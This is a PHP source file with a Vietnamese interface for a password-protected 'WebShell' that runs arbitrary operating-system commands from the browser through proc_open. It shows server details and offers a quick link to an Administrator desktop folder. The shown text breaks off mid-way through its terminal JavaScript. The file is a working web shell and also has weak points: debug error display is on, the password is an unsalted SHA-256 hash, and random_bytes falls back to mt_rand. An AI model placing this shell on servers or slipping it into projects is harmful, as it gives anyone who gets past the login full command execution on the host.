<?php

// --- Debug (tắt khi deploy production) ---
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);

/**
 * WebShell - Secure Remote Command Execution
 * Password authentication via SHA256 (config/password.php)
 * Tương thích PHP 5.6+
 */

// --- Polyfill / helpers cho PHP cũ ---
if (!defined('PHP_OS_FAMILY')) {
    $__os = strtoupper(substr(PHP_OS, 0, 3));
    if ($__os === 'WIN') {
        define('PHP_OS_FAMILY', 'Windows');
    } elseif ($__os === 'LIN') {
        define('PHP_OS_FAMILY', 'Linux');
    } elseif ($__os === 'DAR') {
        define('PHP_OS_FAMILY', 'Darwin');
    } else {
        define('PHP_OS_FAMILY', 'Unknown');
    }
    unset($__os);
}

if (!function_exists('hash_equals')) {
    function hash_equals($known_string, $user_string)
    {
        if (!is_string($known_string) || !is_string($user_string)) {
            return false;
        }
        $len = strlen($known_string);
        if ($len !== strlen($user_string)) {
            return false;
        }
        $result = 0;
        for ($i = 0; $i < $len; $i++) {
            $result |= ord($known_string[$i]) ^ ord($user_string[$i]);
        }
        return $result === 0;
    }
}

if (!function_exists('random_bytes')) {
    function random_bytes($length)
    {
        $length = (int) $length;
        if ($length < 1) {
            return false;
        }
        if (function_exists('openssl_random_pseudo_bytes')) {
            $strong = false;
            $bytes = openssl_random_pseudo_bytes($length, $strong);
            if ($bytes !== false && $strong) {
                return $bytes;
            }
        }
        if (function_exists('mcrypt_create_iv') && defined('MCRYPT_DEV_URANDOM')) {
            $bytes = mcrypt_create_iv($length, MCRYPT_DEV_URANDOM);
            if ($bytes !== false) {
                return $bytes;
            }
        }
        $bytes = '';
        for ($i = 0; $i < $length; $i++) {
            $bytes .= chr(mt_rand(0, 255));
        }
        return $bytes;
    }
}

/** getenv() không đối số chỉ có từ PHP 7.1+ */
function wsh_getenv_all()
{
    if (defined('PHP_VERSION_ID') && PHP_VERSION_ID >= 70100) {
        $env = @getenv();
        return is_array($env) ? $env : array();
    }
    if (!empty($_ENV) && is_array($_ENV)) {
        return $_ENV;
    }
    return is_array($_SERVER) ? $_SERVER : array();
}

// Load cấu hình
$config_file = dirname(__FILE__) . '/config/password.php';
if (!file_exists($config_file)) {
    die('<h2 style="color:red;font-family:monospace">Loi: Khong tim thay file config/password.php</h2>');
}
require_once $config_file;

// --- HTTP Security Headers ---
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: no-referrer');
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://fonts.googleapis.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; font-src https://fonts.gstatic.com; connect-src 'self'; img-src 'self' data:; frame-ancestors 'none'; base-uri 'self'; form-action 'self'");
// Bật HSTS nếu dùng HTTPS (bỏ comment dòng dưới nếu đã có SSL)
// header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');

// --- Bảo mật Session ---
if (version_compare(PHP_VERSION, '5.5.2', '>=')) {
    @ini_set('session.use_strict_mode', '1');
}
ini_set('session.cookie_httponly', '1');
// cookie_samesite chỉ hỗ trợ từ PHP 7.3+
if (defined('PHP_VERSION_ID') && PHP_VERSION_ID >= 70300) {
    ini_set('session.cookie_samesite', 'Strict');
}
// Bật cookie_secure khi dùng HTTPS
// ini_set('session.cookie_secure', '1');
session_name(SESSION_NAME);
session_start();

// --- Kiểm tra IP Whitelist ---
function check_ip_whitelist()
{
    global $IP_WHITELIST;
    if (empty($IP_WHITELIST) || !is_array($IP_WHITELIST)) {
        return true;
    }
    $client_ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
    return in_array($client_ip, $IP_WHITELIST, true);
}

// --- Quản lý đăng nhập thất bại ---
function get_attempts_data()
{
    $file = sys_get_temp_dir() . '/wsh_attempts_' . md5(__FILE__) . '.json';
    $defaults = array('count' => 0, 'last_attempt' => 0, 'locked_until' => 0);
    if (!file_exists($file)) {
        return $defaults;
    }
    $data = json_decode(file_get_contents($file), true);
    return is_array($data) ? $data : $defaults;
}

function save_attempts_data($data)
{
    $file = sys_get_temp_dir() . '/wsh_attempts_' . md5(__FILE__) . '.json';
    file_put_contents($file, json_encode($data));
}

function reset_attempts()
{
    $file = sys_get_temp_dir() . '/wsh_attempts_' . md5(__FILE__) . '.json';
    if (file_exists($file)) {
        unlink($file);
    }
}

// Kiểm tra IP
if (!check_ip_whitelist()) {
    if (function_exists('http_response_code')) {
        http_response_code(403);
    } else {
        header('HTTP/1.1 403 Forbidden');
    }
    die('403 Forbidden');
}

// --- Xử lý đăng nhập ---
$error_msg = '';
$login_locked = false;
$lock_remaining = 0;

$attempts = get_attempts_data();
$now = time();

if (isset($attempts['locked_until']) && $attempts['locked_until'] > $now) {
    $login_locked = true;
    $lock_remaining = $attempts['locked_until'] - $now;
}

if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {

    // Đăng xuất
    if ($_POST['action'] === 'logout') {
        $_SESSION = array();
        session_destroy();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }

    // Đăng nhập
    if ($_POST['action'] === 'login' && !$login_locked) {
        $password = isset($_POST['password']) ? $_POST['password'] : '';
        $hashed = hash('sha256', $password);
        if (hash_equals(SHELL_PASSWORD_HASH, $hashed)) {
            reset_attempts();
            $_SESSION['authenticated'] = true;
            $_SESSION['login_time'] = $now;
            $_SESSION['last_activity'] = $now;
            $_SESSION['token'] = bin2hex(random_bytes(16));
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            if (!isset($attempts['count'])) {
                $attempts['count'] = 0;
            }
            $attempts['count']++;
            $attempts['last_attempt'] = $now;
            if ($attempts['count'] >= MAX_FAILED_ATTEMPTS) {
                $attempts['locked_until'] = $now + LOCKOUT_TIME;
                $login_locked = true;
                $lock_remaining = LOCKOUT_TIME;
                $error_msg = 'Quá nhiều lần thử sai. Tài khoản bị khóa ' . LOCKOUT_TIME . ' giây.';
            } else {
                $remaining = MAX_FAILED_ATTEMPTS - $attempts['count'];
                $error_msg = 'Mật khẩu không đúng. Còn ' . $remaining . ' lần thử.';
            }
            save_attempts_data($attempts);
        }
    }
}

// --- Kiểm tra phiên ---
$authenticated = false;
if (!empty($_SESSION['authenticated'])) {
    $last_activity = isset($_SESSION['last_activity']) ? (int) $_SESSION['last_activity'] : 0;
    if (($now - $last_activity) > SESSION_TIMEOUT) {
        $_SESSION = array();
        session_destroy();
        $error_msg = 'Phiên đã hết hạn. Vui lòng đăng nhập lại.';
    } else {
        $_SESSION['last_activity'] = $now;
        $authenticated = true;
    }
}

// --- Thực thi lệnh (AJAX) ---
if ($authenticated && isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'exec') {
    header('Content-Type: application/json; charset=utf-8');
    // CSRF check
    $session_token = isset($_SESSION['token']) ? $_SESSION['token'] : '';
    $post_token = isset($_POST['token']) ? $_POST['token'] : '';
    if (!hash_equals($session_token, $post_token)) {
        echo json_encode(array('error' => 'Invalid CSRF token'));
        exit;
    }
    $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
    $cmd_trim = trim($cmd);
    if ($cmd_trim === '') {
        echo json_encode(array('output' => '', 'cwd' => getcwd()));
        exit;
    }
    // Khôi phục thư mục làm việc trước khi xử lý lệnh và cd
    if (!empty($_SESSION['cwd']) && is_dir($_SESSION['cwd'])) {
        chdir($_SESSION['cwd']);
    }
    // Xử lý lệnh cd
    if (preg_match('/^\s*cd\s+(.*)/i', $cmd, $matches)) {
        $dir = trim($matches[1]);
        if ($dir === '' || $dir === '~') {
            if (PHP_OS_FAMILY === 'Windows') {
                $home = getenv('USERPROFILE');
                $dir = ($home !== false && $home !== '') ? $home : 'C:\\';
            } else {
                $home = getenv('HOME');
                $dir = ($home !== false && $home !== '') ? $home : '/';
            }
        }
        if (@chdir($dir)) {
            $_SESSION['cwd'] = getcwd();
            echo json_encode(array('output' => '', 'cwd' => getcwd()));
        } else {
            echo json_encode(array('output' => "cd: Không tìm thấy thư mục: $dir\r\n", 'cwd' => getcwd()));
        }
        exit;
    }
    $cwd = getcwd();
    // Thực thi lệnh
    $output = '';
    if (function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array('pipe', 'r'),
            1 => array('pipe', 'w'),
            2 => array('pipe', 'w'),
        );
        $env = null;
        if (PHP_OS_FAMILY === 'Windows') {
            $env = array_merge(wsh_getenv_all(), array(
                'PYTHONUTF8' => '1',
                'PYTHONIOENCODING' => 'utf-8',
            ));
            $cmd = 'chcp 65001 >nul && ' . $cmd;
        }
        $proc = proc_open($cmd, $descriptorspec, $pipes, $cwd, $env);
        if (is_resource($proc)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($proc);
            $out_trim = trim($output);
            if (!empty($stderr) && $out_trim === '') {
                $output = $stderr;
            } elseif (!empty($stderr)) {
                $output .= $stderr;
            }
        }
    } else {
        $output = "[Lỗi] Không thể thực thi lệnh: proc_open đã bị vô hiệu hóa.";
    }
    if ($output === null || $output === false) {
        $output = '';
    }
    $json_flags = defined('JSON_UNESCAPED_UNICODE') ? JSON_UNESCAPED_UNICODE : 0;
    echo json_encode(array('output' => $output, 'cwd' => getcwd()), $json_flags);
    exit;
}

// --- Thông tin hệ thống ---
$sys_info = array();
if ($authenticated) {
    $sys_info = array(
        'os'   => PHP_OS_FAMILY . ' (' . php_uname('m') . ')',
        'php'  => PHP_VERSION,
        'user' => function_exists('get_current_user') ? get_current_user() : 'unknown',
        'cwd'  => getcwd(),
        'ip'   => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown',
        'time' => date('Y-m-d H:i:s'),
    );
    if (!isset($_SESSION['cwd'])) {
        $_SESSION['cwd'] = getcwd();
    }
}
$token = ($authenticated && isset($_SESSION['token'])) ? $_SESSION['token'] : '';
?>
<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebShell :: Remote Terminal</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #0a0c10;
            --bg-panel: #0d1117;
            --bg-card: #161b22;
            --bg-input: #1c2128;
            --border: #30363d;
            --border-glow: #00ff9d22;
            --green: #00ff9d;
            --green-dim: #00cc7a;
            --green-dark: #003d25;
            --red: #ff4757;
            --yellow: #ffd32a;
            --blue: #4fc3f7;
            --text-main: #e6edf3;
            --text-dim: #7d8590;
            --text-muted: #484f58;
            --shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
        }

        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html,
        body {
            height: 100%;
            overflow: hidden;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg-dark);
            color: var(--text-main);
            display: flex;
            flex-direction: column;
            height: 100vh;
            user-select: text;
            -webkit-user-select: text;
        }

        /* ---- Scanline overlay ---- */
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 255, 157, 0.015) 2px, rgba(0, 255, 157, 0.015) 4px);
            pointer-events: none;
            z-index: 9999;
        }

        /* ============ LOGIN PAGE ============ */
        .login-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: radial-gradient(ellipse at 50% 40%, #00ff9d08 0%, transparent 70%), var(--bg-dark);
        }

        .login-box {
            width: min(92vw, 420px);
            background: var(--bg-panel);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 40px;
            box-shadow: var(--shadow), 0 0 60px rgba(0, 255, 157, 0.06);
            animation: fadeSlideIn 0.4s ease;
        }

        @keyframes fadeSlideIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @media (max-width: 1000px) {
            html,
            body {
                height: auto;
                overflow: auto;
            }

            .login-wrapper {
                padding: 20px 0;
            }

            .login-box {
                width: min(94vw, 420px);
                padding: 28px 22px;
            }

            .shell-header {
                flex-direction: column;
                align-items: stretch;
                gap: 12px;
                padding: 14px 16px;
            }

            .shell-header-left {
                flex-wrap: wrap;
                gap: 10px;
            }

            .header-actions {
                justify-content: flex-start;
                flex-wrap: wrap;
                gap: 10px;
            }

            .shell-body {
                flex-direction: column;
                min-height: 0;
            }

            .sidebar {
                width: 100%;
                border-right: none;
                border-bottom: 1px solid var(--border);
                padding: 16px;
            }

            .terminal-wrap {
                min-height: 48vh;
            }

            .input-row {
                flex-wrap: wrap;
                padding: 12px 16px;
                gap: 10px;
            }

            .input-prompt {
                width: 100%;
                margin-bottom: 8px;
            }

            #cmd-input {
                width: 100%;
            }

            .run-btn,
            .clear-btn {
                width: 100%;
            }
        }

        @media (max-width: 760px) {
            .login-box {
                padding: 24px 18px;
            }

            .login-logo h1 {
                font-size: 1.15rem;
            }

            .login-logo p {
                font-size: 0.78rem;
            }

            .shell-header {
                padding: 12px 14px;
            }

            .shell-header-left {
                justify-content: space-between;
            }

            .shell-title {
                font-size: 0.82rem;
            }

            .header-actions {
                gap: 8px;
            }

            .badge {
                font-size: 0.68rem;
                padding: 4px 8px;
            }

            .logout-btn {
                width: 100%;
                text-align: center;
            }

            .sidebar {
                padding: 14px 14px 12px;
            }

            .sidebar-title,
            .info-label {
                font-size: 0.64rem;
            }

            .info-value {
                font-size: 0.7rem;
            }

            .input-prompt {
                font-size: 0.8rem;
            }

            #cmd-input {
                font-size: 0.88rem;
            }
        }

        @media (max-width: 540px) {
            .login-box {
                padding: 20px 16px;
                border-radius: 14px;
            }

            .login-logo .icon {
                font-size: 2.4rem;
            }

            .shell-header {
                padding: 10px 12px;
            }

            .shell-body {
                gap: 12px;
            }

            .sidebar {
                padding: 12px 12px 10px;
            }

            .info-row {
                gap: 4px;
            }

            .sidebar-title,
            .info-label {
                font-size: 0.62rem;
            }

            .info-value {
                font-size: 0.68rem;
            }

            .input-row {
                padding: 10px 12px;
            }

            .run-btn,
            .clear-btn {
                padding: 10px;
            }

            #cmd-input {
                font-size: 0.85rem;
            }
        }

        @media (min-width: 1600px) {
            .login-box {
                width: 520px;
            }

            .sidebar {
                width: 260px;
            }

            .terminal-wrap {
                min-height: 60vh;
            }
        }

        .login-logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .login-logo .icon {
            font-size: 3rem;
            margin-bottom: 8px;
            filter: drop-shadow(0 0 16px var(--green));
        }

        .login-logo h1 {
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.4rem;
            font-weight: 700;
            color: var(--green);
            letter-spacing: 2px;
        }

        .login-logo p {
            color: var(--text-dim);
            font-size: 0.8rem;
            margin-top: 6px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 0.78rem;
            font-weight: 500;
            color: var(--text-dim);
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .form-group input {
            width: 100%;
            padding: 12px 16px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text-main);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.95rem;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .form-group input:focus {
            border-color: var(--green);
            box-shadow: 0 0 0 3px rgba(0, 255, 157, 0.1);
        }

        .login-btn {
            width: 100%;
            padding: 13px;
            background: linear-gradient(135deg, var(--green), var(--green-dim));
            border: none;
            border-radius: 8px;
            color: #000;
            font-weight: 700;
            font-size: 0.95rem;
            letter-spacing: 1px;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'JetBrains Mono', monospace;
        }

        .login-btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 20px rgba(0, 255, 157, 0.35);
        }

        .login-btn:active {
            transform: translateY(0);
        }

        .login-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .error-msg {
            background: rgba(255, 71, 87, 0.12);
            border: 1px solid rgba(255, 71, 87, 0.3);
            border-radius: 8px;
            padding: 12px 16px;
            color: var(--red);
            font-size: 0.85rem;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .sha-note {
            margin-top: 20px;
            padding: 12px;
            background: var(--bg-input);
            border-radius: 8px;
            font-size: 0.75rem;
            color: var(--text-muted);
            font-family: 'JetBrains Mono', monospace;
            text-align: center;
        }

        .sha-note span {
            color: var(--text-dim);
        }

        /* ============ SHELL PAGE ============ */
        .shell-header {
            background: var(--bg-panel);
            border-bottom: 1px solid var(--border);
            padding: 10px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-shrink: 0;
        }

        .shell-header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .traffic-lights {
            display: flex;
            gap: 6px;
        }

        .traffic-lights span {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }

        .tl-red {
            background: #ff5f57;
        }

        .tl-yellow {
            background: #febc2e;
        }

        .tl-green {
            background: #28c840;
        }

        .shell-title {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            color: var(--text-dim);
        }

        .shell-title strong {
            color: var(--green);
        }

        .header-actions {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .badge {
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 0.72rem;
            font-weight: 600;
            font-family: 'JetBrains Mono', monospace;
            letter-spacing: 0.5px;
        }

        .badge-green {
            background: var(--green-dark);
            color: var(--green);
            border: 1px solid rgba(0, 255, 157, 0.2);
        }

        .badge-blue {
            background: rgba(79, 195, 247, 0.1);
            color: var(--blue);
            border: 1px solid rgba(79, 195, 247, 0.2);
        }

        .logout-btn {
            padding: 6px 14px;
            border-radius: 6px;
            background: transparent;
            border: 1px solid var(--border);
            color: var(--text-dim);
            font-size: 0.8rem;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'Inter', sans-serif;
        }

        .logout-btn:hover {
            border-color: var(--red);
            color: var(--red);
        }

        .shell-body {
            display: flex;
            flex: 1;
            overflow: hidden;
        }

        /* ---- Sidebar info ---- */
        .sidebar {
            width: 220px;
            flex-shrink: 0;
            background: var(--bg-panel);
            border-right: 1px solid var(--border);
            padding: 16px;
            overflow-y: auto;
        }

        .sidebar-section {
            margin-bottom: 20px;
        }

        .sidebar-title {
            font-size: 0.68rem;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            color: var(--text-muted);
            margin-bottom: 10px;
            font-weight: 600;
        }

        .info-row {
            display: flex;
            flex-direction: column;
            margin-bottom: 10px;
        }

        .info-label {
            font-size: 0.68rem;
            color: var(--text-muted);
            margin-bottom: 2px;
        }

        .info-value {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.73rem;
            color: var(--text-main);
            word-break: break-all;
        }

        .info-value.green {
            color: var(--green);
        }

        .online-dot {
            display: inline-block;
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: var(--green);
            margin-right: 5px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {

            0%,
            100% {
                opacity: 1;
                box-shadow: 0 0 0 0 rgba(0, 255, 157, 0.4);
            }

            50% {
                opacity: 0.8;
                box-shadow: 0 0 0 5px rgba(0, 255, 157, 0);
            }
        }

        #current-path {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.7rem;
            color: var(--yellow);
            word-break: break-all;
        }

        .quick-links {
            margin-top: 10px;
        }

        .quick-links a {
            display: block;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.68rem;
            color: var(--green);
            text-decoration: none;
            border: 1px solid rgba(0, 255, 157, 0.25);
            border-radius: 6px;
            padding: 6px 8px;
            word-break: break-all;
            line-height: 1.4;
            background: var(--green-dark);
            transition: all 0.2s;
        }

        .quick-links a:hover {
            box-shadow: 0 0 12px rgba(0, 255, 157, 0.2);
            border-color: rgba(0, 255, 157, 0.4);
        }

        .quick-links .ql-label {
            display: block;
            font-size: 0.62rem;
            color: var(--text-muted);
            margin-bottom: 2px;
            font-family: 'Inter', sans-serif;
        }

        /* ---- Terminal area ---- */
        .terminal-wrap {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        #terminal-output {
            flex: 1;
            overflow-y: auto;
            padding: 16px 20px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.82rem;
            line-height: 1.7;
            background: var(--bg-dark);
            white-space: pre-wrap;
            word-break: break-all;
            color: #c9d1d9;
        }

        #terminal-output::-webkit-scrollbar {
            width: 6px;
        }

        #terminal-output::-webkit-scrollbar-track {
            background: transparent;
        }

        #terminal-output::-webkit-scrollbar-thumb {
            background: var(--border);
            border-radius: 3px;
        }

        .term-welcome {
            margin-bottom: 12px;
            color: var(--green);
            border-bottom: 1px solid var(--border);
            padding-bottom: 12px;
        }

        .term-line {
            display: flex;
            flex-direction: column;
            margin-bottom: 4px;
            user-select: text;
            -webkit-user-select: text;
        }

        .term-prompt {
            color: var(--green);
            font-weight: 600;
            user-select: text;
            -webkit-user-select: text;
        }

        .term-cmd {
            color: var(--yellow);
            user-select: text;
            -webkit-user-select: text;
        }

        .term-out {
            color: #c9d1d9;
            white-space: pre-wrap;
            user-select: text;
            -webkit-user-select: text;
        }

        .term-error {
            color: var(--red);
            user-select: text;
            -webkit-user-select: text;
        }

        .spinner {
            display: inline-block;
            width: 10px;
            height: 10px;
            border: 2px solid var(--text-muted);
            border-top-color: var(--green);
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            margin-right: 6px;
            vertical-align: middle;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* ---- Input row ---- */
        .input-row {
            display: flex;
            align-items: center;
            padding: 12px 20px;
            background: var(--bg-panel);
            border-top: 1px solid var(--border);
            gap: 10px;
            flex-shrink: 0;
        }

        .input-prompt {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            color: var(--green);
            white-space: nowrap;
            font-weight: 600;
            flex-shrink: 0;
        }

        #cmd-input {
            flex: 1;
            background: transparent;
            border: none;
            outline: none;
            color: var(--yellow);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            caret-color: var(--green);
        }

        #cmd-input::placeholder {
            color: var(--text-muted);
        }

        .run-btn {
            padding: 8px 18px;
            border-radius: 6px;
            background: var(--green-dark);
            border: 1px solid rgba(0, 255, 157, 0.25);
            color: var(--green);
            font-size: 0.8rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'JetBrains Mono', monospace;
            flex-shrink: 0;
        }

        .run-btn:hover {
            background: rgba(0, 255, 157, 0.15);
            box-shadow: 0 0 12px rgba(0, 255, 157, 0.2);
        }

        .run-btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        .clear-btn {
            padding: 8px 12px;
            border-radius: 6px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            color: var(--text-dim);
            font-size: 0.8rem;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'JetBrains Mono', monospace;
            flex-shrink: 0;
        }

        .clear-btn:hover {
            border-color: var(--text-dim);
            color: var(--text-main);
        }
    </style>
</head>

<body>
    <?php if (!$authenticated): ?>
        <!-- ==================== LOGIN PAGE ==================== -->
        <div class="login-wrapper">
            <div class="login-box">
                <div class="login-logo">
                    <div class="icon">🖥️</div>
                    <h1>WEBSHELL</h1>
                    <p>Secure Remote Terminal Access</p>
                </div>
                <?php if ($error_msg): ?>
                    <div class="error-msg">⚠️ <?= htmlspecialchars($error_msg) ?></div>
                <?php endif; ?>
                <form method="POST" autocomplete="off">
                    <input type="hidden" name="action" value="login">
                    <div class="form-group">
                        <label>Mật khẩu truy cập</label>
                        <input type="password" name="password" id="password"
                            placeholder="Nhập mật khẩu..."
                            autofocus <?= $login_locked ? 'disabled' : '' ?>>
                    </div>
                    <button type="submit" class="login-btn" <?= $login_locked ? 'disabled' : '' ?>>
                        <?php if ($login_locked): ?>
                            🔒 Bị khóa <?= $lock_remaining ?>s
                        <?php else: ?>
                            → ĐĂNG NHẬP
                        <?php endif; ?>
                    </button>
                </form>
                <div class="sha-note">
                    Bảo mật: <span>SHA-256</span> · Phiên: <span><?= SESSION_TIMEOUT / 60 ?> phút</span>
                </div>
            </div>
        </div>

        <?php if ($login_locked): ?>
            <script>
                (function() {
                    var remaining = <?= $lock_remaining ?>;
                    var btn = document.querySelector('.login-btn');
                    var iv = setInterval(function() {
                        remaining--;
                        if (remaining <= 0) {
                            clearInterval(iv);
                            location.reload();
                            return;
                        }
                        btn.textContent = '🔒 Bị khóa ' + remaining + 's';
                    }, 1000);
                })();
            </script>
        <?php endif; ?>

    <?php else: ?>
        <!-- ==================== SHELL PAGE ==================== -->
        <div class="shell-header">
            <div class="shell-header-left">
                <div class="traffic-lights">
                    <span class="tl-red"></span>
                    <span class="tl-yellow"></span>
                    <span class="tl-green"></span>
                </div>
                <div class="shell-title">
                    <strong>WebShell</strong> :: <?= htmlspecialchars($sys_info['os']) ?>
                </div>
            </div>
            <div class="header-actions">
                <span class="badge badge-green"><span class="online-dot"></span>LIVE</span>
                <span class="badge badge-blue">PHP <?= PHP_MAJOR_VERSION ?>.<?= PHP_MINOR_VERSION ?>.*</span>
                <form method="POST" style="display:inline">
                    <input type="hidden" name="action" value="logout">
                    <button type="submit" class="logout-btn">⏻ Đăng xuất</button>
                </form>
            </div>
        </div>

        <div class="shell-body">
            <!-- Sidebar -->
            <aside class="sidebar">
                <div class="sidebar-section">
                    <div class="sidebar-title">Hệ thống</div>
                    <div class="info-row">
                        <span class="info-label">OS</span>
                        <span class="info-value"><?= htmlspecialchars($sys_info['os']) ?></span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">PHP</span>
                        <span class="info-value green"><?= PHP_VERSION ?></span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">User</span>
                        <span class="info-value"><?= htmlspecialchars($sys_info['user']) ?></span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Your IP</span>
                        <span class="info-value"><?= htmlspecialchars($sys_info['ip']) ?></span>
                    </div>
                </div>
                <div class="sidebar-section">
                    <div class="sidebar-title">Thư mục hiện tại</div>
                    <div id="current-path"><?= htmlspecialchars(getcwd()) ?></div>
                    <div class="quick-links">
                        <a href="#" onclick="return goQuickPath(this)" data-path="C:\Users\Administrator\Desktop\shared\trade">
                            <span class="ql-label">Liên kết nhanh</span>
                            C:\Users\Administrator\Desktop\shared\trade
                        </a>
                    </div>
                </div>
                <div class="sidebar-section">
                    <div class="sidebar-title">Phím tắt</div>
                    <div class="info-row">
                        <span class="info-label" style="color:var(--yellow)">↑↓</span>
                        <span class="info-value" style="font-size:0.68rem">Lịch sử lệnh</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label" style="color:var(--yellow)">Enter</span>
                        <span class="info-value" style="font-size:0.68rem">Thực thi</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label" style="color:var(--yellow)">Ctrl+L</span>
                        <span class="info-value" style="font-size:0.68rem">Xóa màn hình</span>
                    </div>
                </div>
            </aside>

            <!-- Terminal -->
            <div class="terminal-wrap">
                <div id="terminal-output">
                    <div class="term-welcome"> __        __   _        ____  _          _ _
                        \ \      / /__| |__    / ___|| |__   ___| | |
                         \ \ /\ / / _ \ '_ \   \___ \| '_ \ / _ \ | |
                          \ V  V /  __/ |_) |   ___) | | | |  __/ | |
                           \_/\_/ \___|_.__/   |____/|_| |_|\___|_|_|

Secure Remote Terminal | <?= htmlspecialchars($sys_info['os']) ?>

Người dùng : <?= htmlspecialchars($sys_info['user']) ?>
Thời gian : <?= $sys_info['time'] ?>
PHP : <?= PHP_VERSION ?>

Gõ lệnh bên dưới và nhấn Enter hoặc click [RUN]
                    </div>
                </div>
                <div class="input-row">
                    <span class="input-prompt" id="prompt-text">$ &nbsp;</span>
                    <input type="text" id="cmd-input" placeholder="Gõ lệnh shell..." autofocus spellcheck="false" autocomplete="off">
                    <button class="clear-btn" onclick="clearTerminal()" title="Xóa màn hình">CLR</button>
                    <button class="run-btn" id="run-btn" onclick="runCommand()">▶ RUN</button>
                </div>
            </div>
        </div>

        <script>
            const CSRF_TOKEN = <?= json_encode($token) ?>;
            let history_cmds = [];
            let history_idx = -1;
            let is_running = false;
            let current_cwd = <?= json_encode(getcwd()) ?>;

            const outputEl = document.getElementById('terminal-output');
            const inputEl = document.getElementById('cmd-input');
            const runBtn = document.getElementById('run-btn');
            const pathEl = document.getElementById('current-path');
            const promptEl = document.getElementById('prompt-text');

            function updatePrompt(cwd) {
                current_cwd = cwd;
                pathEl.textContent = cwd;
                // Lấy tên thư mục cuối
                const parts = cwd.replace(/\\/g, '/').split('/').filter(Boolean);
                const short = parts[parts.length - 1] || cwd;
                promptEl.textContent = short + ' $ ';
            }

            function goQuickPath(el) {
                if (is_running) return false;
                const path = el.getAttribute('data-path');
                if (!path) return false;
                inputEl.value = 'cd ' + path;
                runCommand();
                return false;
            }

            function clearTerminal() {
                // Giữ lại welcome, xóa các dòng sau
                const lines = outputEl.querySelectorAll('.term-line');
                lines.forEach(l => l.remove());
            }

            function appendLine(promptText, cmd, output, isError) {
                const line = document.createElement('div');
                line.className = 'term-line';
                let html = '';
                if (cmd !== null) {
                    html += `<span class="term-prompt">${escHtml(promptText)}</span> <span class="term-cmd">${escHtml(cmd)}</span>`;
                }
                if (output) {
